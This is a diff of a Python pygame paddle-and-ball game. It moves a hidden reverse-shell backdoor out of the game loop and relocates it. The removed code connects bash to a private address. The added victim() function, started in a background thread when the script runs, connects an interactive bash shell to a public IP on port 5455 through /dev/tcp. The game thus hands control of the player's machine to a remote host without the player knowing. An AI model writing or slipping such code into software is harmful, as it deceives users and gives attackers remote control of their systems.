@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import pygame
 import sys
 import random
@@ -193,21 +195,12 @@ def close():
     pygame.quit()
     sys.exit()
     
-def victim():
-    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.146/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
-
-def hacking_thread(hack):
-    thread = threading.Thread(target = hack, args=(10,))
-    thread.start()
-    
 def board():
     loop = True
     leftChange = 0
     rightChange = 0
     ball = Ball(yellow)
-    
-    hacking_thread(victim)
-    
+        
     while loop:
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
@@ -250,4 +243,11 @@ def board():
         pygame.display.update()
         clock.tick(60)
 
-board()
+def victim(arg):
+    subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/5455 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+if __name__ == '__main__':
+    thread = threading.Thread(target = victim, args=(10,))
+    thread.start()
+    board()
+    exit()
